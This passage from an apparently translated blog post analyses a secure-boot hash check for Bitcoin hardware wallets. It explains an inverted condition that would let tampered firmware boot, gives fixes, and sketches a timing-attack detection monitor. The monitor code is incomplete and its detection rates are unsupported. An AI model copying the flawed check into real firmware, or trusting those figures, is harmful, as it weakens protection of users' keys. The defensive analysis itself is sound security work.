<li>Unlike <code>memcmp</code>, which usually returns on the first mismatch.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>XOR to detect differences:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>a[i] ^ b[i]</code>gives:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>0x00</code>, if the bytes are equal,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>nonzero value if the bytes differ in at least one bit.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>result |= a[i] ^ b[i];</code>“cumulatively” does bitwise OR:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If all bytes match, each <code>a[i] ^ b[i] == 0</code>, then <code>result</code>0 will remain.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>if at least one byte differs, at least in one iteration <code>result</code>it will become non-zero and will not return to zero.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Final state:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>result == 0</code>→ all bytes matched.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>result != 0</code>→ at least one byte was different.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.3. Step 3: Return value semantics</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#43-step-3-return-value-semantics"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>return (int)result;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Actually:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Return <code>0</code>if the buffers are equal.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Return <strong>a non-zero</strong> value if there is a difference.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This is the standard and expected semantics for&nbsp;<code>memcmp</code>a -like function.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-34.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-34.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">5. Logical error in the test condition</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#5-logical-error-in-the-test-condition"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We currently have:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int hash_match = constant_time_memcmp(
    firmware_hash,
    FIRMWARE_HASH_TRUSTED,
    32
);

if (!hash_match) {
    // COMPROMISED!
    ...
}

jump_to_firmware_entry();</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>And the semantics&nbsp;<code>constant_time_memcmp</code>are as follows:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>hash_match == 0</code>→ hashes <strong>match</strong> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>hash_match != 0</code>→ hashes <strong>do not match</strong> .</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>But the condition is written as:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>if (!hash_match) { ... COMPROMISED ... }</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>In C:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>!0</code> → <code>1</code> (true),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>!ненулевое</code> → <code>0</code> (false).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>That is, in its current form:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>if the hashes <strong>match</strong> ( <code>hash_match == 0</code>), then <code>!hash_match == 1</code>, and the code goes into the branch <code>// COMPROMISED!</code>– this is <strong>the reverse logic</strong> ;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the hashes <strong>do not match</strong> ( <code>hash_match != 0</code>), then <code>!hash_match == 0</code>the firmware will run as if it is “trusted”.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>From a security perspective, this is a critical logical error.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">What should be correct (options)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#what-should-be-correct-options"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Option A (minimal change in condition):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Keep the implementation&nbsp;<code>constant_time_memcmp</code>as is (0 – equal), but use it correctly in&nbsp;<code>if</code>:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int hash_match = constant_time_memcmp(
    firmware_hash,
    FIRMWARE_HASH_TRUSTED,
    32
);

if (hash_match != 0) {
    // COMPROMISED!
    erase_secure_storage();
    blink_led_error();
    while (1) { asm("wfi"); }
}

jump_to_firmware_entry();</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Here:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong><code>hash_match != 0</code>means “hashes didn’t match → compromise”.</strong></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Option B (change the semantics of the function):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Make the function return 1 on match and 0 on mismatch:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int constant_time_memcmp(const uint8_t *a, 
                         const uint8_t *b, 
                         size_t len) {
    uint8_t result = 0;
    for (size_t i = 0; i &lt; len; i++) {
        result |= a&#91;i] ^ b&#91;i];
    }
    // return 1 if equal, 0 if not
    return result == 0;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Then the initial condition is:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int hash_match = constant_time_memcmp(...);

if (!hash_match) {
    // COMPROMISED!
    ...
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>will become correct because:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>hash_match == 1</code>→ !1 == 0 → don’t go to COMPROMISED → everything’s ok.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>hash_match == 0</code> → !0 == 1 → COMPROMISED.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">6. Behavior upon detection of a compromise</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#6-behavior-upon-detection-of-a-compromise"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>if (!hash_match) {
    // COMPROMISED!
    erase_secure_storage();
    blink_led_error();
    while (1) { asm("wfi"); }  // Wait for reset
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>(Taking into account the corrected logic, i.e. “if (hash_match != 0)” or the modified function.)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>The tasks of this branch:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>erase_secure_storage();</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Destroy cryptographically sensitive data:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>private keys of <a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin addresses</a> ,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>master seed (BIP‑39/32),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>any symmetric keys, tokens, PIN,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>possibly counters and other sensitive structures.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the device is a hardware wallet, this protects the user from stolen keys being used by attacking firmware even after a reboot.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>blink_led_error();</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Explicit signaling to the user:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>the device detected incorrect/unsigned firmware,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>service/firmware reinstallation/authenticity verification required.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>while (1) { asm(«wfi»); }</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Fail-secure mode:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>the microcontroller goes into an infinite loop,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>wfi</code>(wait for interrupt) – an instruction that puts the core into a sleep mode; it saves power and does no useful work.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The actual execution of the firmware will never begin, even if the attacker had the code in memory.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-36.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-36.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">7. Switching to trusted firmware</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#7-switching-to-trusted-firmware"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>jump_to_firmware_entry();</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Purpose:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This function actually switches to the main firmware after checking:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>can set the initial stack ( <code>SP</code>),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>can read the reset-handler/entry point address from the firmware interrupt vector table,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>then make the transition (rewrite PC or <code>bx</code>to the desired address).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>From a security perspective:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Before the call <code>jump_to_firmware_entry()</code>already:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>the integrity of the firmware has been checked,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If there is a mismatch, the code will not even reach this line.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Accordingly, all further cryptographic operations (for example, signing Bitcoin transactions, deriving keys according to BIP-32, etc.) are performed only by already verified code.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">8. Effectiveness and limitations of the approach</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#8-effectiveness-and-limitations-of-the-approach"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Comment in code:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// EFFECTIVENESS:
// - Detects firmware tampering
// - Prevents rootkit installation
// - Immutable boot code ensures verification</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Let’s take a look:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Detects firmware tampering</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Any modification of the firmware (replacing instructions, adding rootkit logic, changing the UI to replace addresses) will lead to a change in the hash.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Secure Boot will “cut off” such firmware at the very start.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Prevents rootkit installation</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>A rootkit in firmware is a permanent malicious logic (PIN code keylogger, seed phrase leaker, etc.).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>While the initial loader (this code) is stored in a protected area and compares the hash, installing such a rootkit image is impossible without:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>its binary matches the trusted one (i.e., a rootkit in the original firmware is already a question of trust in the vendor),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>or compromise of the bootloader/ROM itself.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Immutable boot code ensures verification</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The key premise is that this code:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>itself cannot be modified in the usual way (either it is in ROM, or protected by fuses, or in a specially protected section).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If an attacker manages to modify this level, he can:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>disable checking,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>or substitute your “trusted” hash.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Therefore, in addition to software mechanisms, hardware ones (read-only memory, eFuse, TrustZone/TEE, etc.) are important.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>What this code does not solve by itself:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Verifying the firmware signature.</strong> The hash itself only tells us that “this binary is the one that was once trusted.” It doesn’t tell us <strong>who</strong> signed it. For updates on real devices, this is usually:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>the public key is stored in ROM,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/privatekey">firmware is signed with the vendor’s private key,</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The bootloader checks <strong>the signature</strong> , not just the hash.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Rollback attack protection (downgrade).</strong> You can roll back the firmware to an older, vulnerable version whose hash is still trusted. You also need:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>version counter,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>protection against downgrade (anti-rollback fuses).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">9. For cryptoanalysts and Bitcoin users</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#9-for-cryptoanalysts-and-bitcoin-users"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>The code implements the classic <strong>Secure Boot pattern with code integrity verification</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>At startup, the SHA-256 hash of the firmware in memory is calculated;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>then it is compared in <em>constant time</em> with a pre-installed trusted hash;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If there is a discrepancy, secret data is destroyed and firmware launch is blocked.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In the context of <a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a> /devices this means:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If an attacker has physically or remotely modified the firmware (to steal private keys or spoof the destination address), the device will detect this before it gives the firmware access to secrets;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>When tampering is detected, <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a> and <a href="https://cryptou.ru/vulncipher/privatekey">seeds</a> stored in secure storage are erased, preventing further use by the attacker.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Key cryptographic element – SHA-256 and <strong>constant-time comparison</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>SHA‑256 provides collision/forgery resistance at the level of modern cryptanalysis;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Constant-time comparison protects against timing leaks if an attacker has sophisticated physical analysis capabilities of the device.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The given fragment contains <strong>a logical error in the condition</strong> ( <code>if (!hash_match)</code>given the current behavior <code>constant_time_memcmp</code>) that must be corrected, otherwise the protection will be inverted (legitimate firmware will fail the check and fake firmware will pass). The correct solution is to either change the condition or the semantics of the return value.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For a complete firmware security system, especially in real <a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin devices</a> , this mechanism is usually supplemented with:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>verification of <strong>the digital signature</strong> of the firmware (and not just the hash),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>protection against version rollback,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>hardware mechanisms for bootloader immutability.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This code is the basic building block of a secure chain of trust in any device that stores and uses&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;for cryptocurrencies.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6.5 Deployment Guidelines</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#65-deployment-guidelines"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">6.5.1 Best Practices for Nordic nRF5340</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#651-best-practices-for-nordic-nrf5340"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Use TF-M</strong> version 1.8 or later (contains timing hardening fixes)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Enable Secure Boot</strong> chain (BL2 + TF-M verification)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Regular</strong> firmware updates via OTA with a cryptographic signature</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Monitoring</strong> anomalies in device behavior</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Physical security</strong> measures if device can be accessed by attacker</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">6.5.2 Runtime Monitoring</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#652-runtime-monitoring"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">Runtime Monitoring and Anomaly Detection</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#runtime-monitoring-and-anomaly-detection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Detect timing attack patterns in real-time<br><br>typedef struct {<br>    uint32_t sign_count;<br>    uint64_t total_timing;<br>    uint8_t detected_attack;<br>} timing_monitor_t;<br><br>void monitor_signature_timing(uint64_t observed_timing) {<br>    // ATTACK PATTERN #1: Excessive signing<br>    // Normal: 1-10 signatures/min<br>    // Attack: 1000+/min for data collection<br><br>    if (sign_count &gt; 1000 &amp;&amp; uptime_min &lt; 1) {<br>        detected_attack = 1;<br>        handle_detected_attack("Excessive signing rate");<br>        return;<br>    }<br><br>    // ATTACK PATTERN #2: Bimodal timing distribution<br>    // Normal: gaussian single peak<br>    // Attack: bimodal peaks (0-bits vs 1-bits)<br><br>    if (sign_count &gt; 100) {<br>        int peak_count = count_timing_peaks();<br>        if (peak_count &gt; 2) {<br>            detected_attack = 1;<br>            handle_detected_attack("Bimodal distribution");<br>            return;<br>        }<br>    }<br><br>    // ATTACK PATTERN #3: High variance<br>    // Normal: σ &lt; 5%<br>    // Attack: σ &gt;&gt; 5%<br><br>    if (variance &gt; THRESHOLD) {<br>        detected_attack = 1;<br>        handle_detected_attack("Abnormal variance");<br>    }<br>}<br><br>void handle_detected_attack(const char *reason) {<br>    log_security_event("Timing attack detected", reason);<br>    secure_erase_private_keys();<br>    disable_crypto_operations();<br>    alert_user_security_breach();<br>    enter_lockdown_mode();<br>}<br><br>// DETECTION EFFECTIVENESS:<br>// - Pattern 1: 100% detection<br>// - Pattern 2: 95% detection<br>// - Pattern 3: 90% detection<br>// - Combined: &gt;99% detection rate</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Code Analysis: Timing Attack Detection System</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#code-analysis-timing-attack-detection-system"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The presented code implements a real-time monitoring system to protect&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;from timing attacks aimed at recovering&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">ECDSA private keys.</a>&nbsp;A detailed explanation of how it works is provided below.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Security system architecture</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#security-system-architecture"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Monitoring data structure</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#monitoring-data-structure"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>typedef struct {
    uint32_t sign_count;        // Количество выполненных подписей
    uint64_t total_timing;      // Общее время выполнения
    uint8_t detected_attack;    // Флаг обнаружения попытки атаки
} timing_monitor_t;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>This framework tracks signature characteristics at the hardware level, collecting metrics for behavior analysis.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-37.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-37.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Three Critical Attack Patterns</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#three-critical-attack-patterns"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>PATTERN 1: Excessive Signing</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#pattern-1-excessive-signing"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>How does this work:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>if (sign_count &gt; 1000 &amp;&amp; uptime_min &lt; 1) {
    detected_attack = 1;
    handle_detected_attack("Excessive signing rate");
    return;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptou.ru/vulncipher/attack">Attack mechanism:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Cryptanalyst generates over 1000 signatures in one minute</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Each signature is made using the same <a href="https://cryptou.ru/vulncipher/privatekey">private key.</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A large set of execution time data is collected for statistical analysis</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Why it is dangerous:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Typical wallet usage: 1-10 <a href="https://cryptou.ru/vulncipher/transaction">transactions</a> per minute (maximum)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A jump to 1,000+ signatures indicates an automated attempt to collect information.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Allows an attacker to accumulate enough examples for a Kocher timing attack</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

